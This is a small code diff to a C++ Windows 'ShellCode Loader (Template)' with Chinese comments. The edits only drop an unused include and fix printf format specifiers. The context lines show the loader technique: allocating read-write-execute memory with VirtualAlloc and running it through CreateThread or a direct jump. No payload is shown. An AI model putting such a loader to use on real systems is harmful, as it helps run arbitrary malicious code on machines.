@@ -1,6 +1,5 @@
 #include <windows.h>
 #include <cstdio>
-#include <vector>
 
 /**
  * ShellCode Loader (Template)
@@ -28,7 +27,7 @@ int main() {
     // 2. 分配可执行内存
     void* execMem = VirtualAlloc(0, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!execMem) {
-        printf("[-] VirtualAlloc failed: %d\n", GetLastError());
+        printf("[-] VirtualAlloc failed: %lu\n", GetLastError());
         return 1;
     }
     printf("[+] Memory allocated at: %p\n", execMem);
@@ -48,7 +47,7 @@ int main() {
     } else {
         // 方法 B: 直接跳转 (仅适用于简单 ShellCode)
         // ((void(*)())execMem)();
-        printf("[-] CreateThread failed: %d\n", GetLastError());
+        printf("[-] CreateThread failed: %lu\n", GetLastError());
     }
 
     printf("[+] Execution finished.\n");
